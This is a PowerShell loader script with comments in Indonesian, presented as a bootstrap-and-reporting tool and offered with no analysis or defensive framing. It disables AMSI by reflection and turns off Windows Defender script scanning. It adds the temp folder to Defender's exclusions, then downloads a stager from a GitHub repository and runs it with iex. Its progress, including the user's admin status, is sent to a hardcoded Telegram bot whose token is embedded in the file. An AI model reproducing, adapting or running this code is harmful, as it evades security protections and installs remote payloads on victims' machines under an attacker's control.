# b.ps1 - bootstrap + pelaporan. Semua kegagalan dilaporkan, tidak ditelan.
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

$bot  = '9037027380:AAFrvv-oDxBH65pNbv0aNAflsjMAijyDMKo'
$chat = '949121454'
$bl   = Join-Path $env:TEMP 'b.txt'

function B($s) { $s | Out-File $bl -Append -Encoding utf8 }
function S($cap) {
    if ($bot -and $chat) {
        curl.exe -s -F "chat_id=$chat" -F "document=@$bl" -F "caption=$cap" "https://api.telegram.org/bot$bot/sendDocument" > $null
    }
}

Remove-Item $bl -Force
B "mulai admin=$(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"
S 'b-start'

# 1. AMSI mati lewat reflection - jalan tanpa admin.
try {
    $a = [Ref].Assembly.GetType(('System.Management.Automation.Amsi' + 'Utils'))
    $a.GetField(('amsiInit' + 'Failed'), 'NonPublic,Static').SetValue($null, $true)
    B 'amsi off'
} catch { B "amsi gagal: $($_.Exception.Message)" }
S 'b-amsi'

# 2. Komponen scan + exclusion (butuh admin, kalau gagal lanjut saja).
try { Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop; B 'scan off' } catch { B 'scan gagal' }
try { Add-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction Stop; B 'excl ok' } catch { B 'excl gagal' }

# 3. Muat stager; raw dulu, lalu mirror.
$urls = @(
    'https://raw.githubusercontent.com/byteforge0-cloud/darkwhisper/refs/heads/main/st.ps1',
    'https://github.com/byteforge0-cloud/darkwhisper/raw/refs/heads/main/st.ps1'
)
foreach ($u in $urls) {
    try {
        $s = (New-Object Net.WebClient).DownloadString($u)
        B "ambil $($s.Length) byte"
        if ($s.Length -gt 500) { iex $s; B 'st dijalankan'; break }
        B 'terlalu pendek, lanjut mirror'
    } catch { B "gagal: $($_.Exception.Message)" }
}
S 'b-end'
